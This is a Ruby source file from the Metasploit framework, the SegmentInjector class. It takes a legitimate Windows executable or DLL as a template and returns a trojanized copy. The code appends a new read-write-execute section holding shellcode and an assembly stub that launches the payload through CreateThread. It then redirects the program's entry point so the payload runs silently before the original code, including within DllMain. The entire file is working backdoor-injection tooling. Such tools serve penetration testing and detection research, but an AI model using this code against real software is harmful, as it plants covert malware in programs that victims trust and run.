module Msf
module Exe

  require 'metasm'

  class SegmentInjector

    attr_accessor :payload
    attr_accessor :template
    attr_accessor :arch
    attr_accessor :buffer_register

    def initialize(opts = {})
      @payload = opts[:payload]
      @template = opts[:template]
      @arch  = opts[:arch] || :x86
      @buffer_register = opts[:buffer_register] || 'edx'
      unless %w{eax ecx edx ebx edi esi}.include?(@buffer_register.downcase)
        raise ArgumentError, ":buffer_register is not a real register"
      end
    end

    def processor
      case @arch
      when :x86
        return Metasm::Ia32.new
      when :x64
        return Metasm::X86_64.new
      end
    end

    def create_thread_stub
      <<-EOS
        pushad
        push hook_libname
        call [iat_LoadLibraryA]
        push hook_funcname
        push eax
        call [iat_GetProcAddress]
        lea edx, [thread_hook]
        push 0
        push 0
        push 0
        push edx
        push 0
        push 0
        call eax

        popad
        jmp entrypoint

        hook_libname db 'kernel32', 0
        hook_funcname db 'CreateThread', 0

        thread_hook:
        lea #{buffer_register}, [thread_hook]
        add #{buffer_register}, 9
      EOS
    end

    def payload_as_asm
      asm = ''
      @payload.each_byte do |byte|
        asm << "db " + sprintf("0x%02x", byte) + "\n"
      end
      return asm
    end

    def payload_stub(prefix)
      asm = "hook_entrypoint:\n#{prefix}\n"
      asm << create_thread_stub
      asm << payload_as_asm
      shellcode = Metasm::Shellcode.assemble(processor, asm)
      shellcode.encoded
    end

    def generate_pe
      # Copy our Template into a new PE
      pe_orig = Metasm::PE.decode_file(template)
      pe = pe_orig.mini_copy

      # Copy the headers and exports
      pe.mz.encoded = pe_orig.encoded[0, pe_orig.coff_offset-4]
      pe.mz.encoded.export = pe_orig.encoded[0, 512].export.dup
      pe.header.time = pe_orig.header.time

      # Don't rebase if we can help it since Metasm doesn't do relocations well
      pe.optheader.dll_characts.delete("DYNAMIC_BASE")

      prefix = ''
      if pe.header.characteristics.include? "DLL"
        # if there is no entry point, just return after we bail or spawn shellcode
        if pe.optheader.entrypoint == 0
          prefix = "cmp [esp + 8], 1
              jz spawncode
entrypoint:
              xor eax, eax
              inc eax
              ret 0x0c
              spawncode:"
        else
          # there is an entry point, we'll need to go to it after we bail or spawn shellcode
          # if fdwReason != DLL_PROCESS_ATTACH, skip the shellcode, jump back to original DllMain
          prefix = "cmp [esp + 8], 1
              jnz entrypoint"
        end
      end
      # Generate a new code section set to RWX with our payload in it
      s = Metasm::PE::Section.new
      s.name = '.text'
      s.encoded = payload_stub prefix
      s.characteristics = %w[MEM_READ MEM_WRITE MEM_EXECUTE]

      # Tell our section where the original entrypoint was
      if pe.optheader.entrypoint != 0
        s.encoded.fixup!('entrypoint' => pe.optheader.image_base + pe.optheader.entrypoint)
      end
      pe.sections << s
      pe.invalidate_header

      # Change the entrypoint to our new section
      pe.optheader.entrypoint = 'hook_entrypoint'
      pe.cpu = pe_orig.cpu

      pe.encode_string
    end

  end
end
end
